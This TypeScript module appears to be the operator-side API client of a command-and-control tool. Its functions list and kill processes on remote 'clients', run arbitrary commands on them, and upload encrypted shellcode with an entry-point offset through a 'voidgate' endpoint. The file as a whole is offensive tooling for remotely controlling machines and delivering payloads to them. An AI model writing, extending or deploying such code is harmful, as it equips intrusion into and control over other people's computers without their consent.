import apiClient from "./client";
import type { ApiResponse, CommandForm, ProcessInfo } from "./types";

const clientPath = (addr: string) =>
  `/client/${encodeURIComponent(addr)}/process`;

export async function listProcesses(addr: string): Promise<ProcessInfo[]> {
  const res = await apiClient.get<ApiResponse<ProcessInfo[]>>(
    clientPath(addr)
  );
  return res.data.body;
}

export async function killProcess(
  addr: string,
  value: string | number,
  type: "pid" | "name"
): Promise<void> {
  await apiClient.delete(`${clientPath(addr)}/${encodeURIComponent(value)}`, {
    params: { type },
  });
}

export async function voidgate(
  addr: string,
  shellcode: File,
  epOffset: number,
  key: string
): Promise<void> {
  const formData = new FormData();
  formData.append("shellcode", shellcode);
  formData.append("ep_offset", String(epOffset));
  formData.append("key", key);
  await apiClient.post(`${clientPath(addr)}/voidgate`, formData, {
    headers: { "Content-Type": "multipart/form-data" },
  });
}

export async function executeCommand(
  addr: string,
  form: CommandForm
): Promise<string> {
  const params = new URLSearchParams();
  params.append("command", form.command);
  params.append("option", form.option);
  const res = await apiClient.post<ApiResponse<string>>(
    `${clientPath(addr)}/execute`,
    params
  );
  return res.data.body;
}
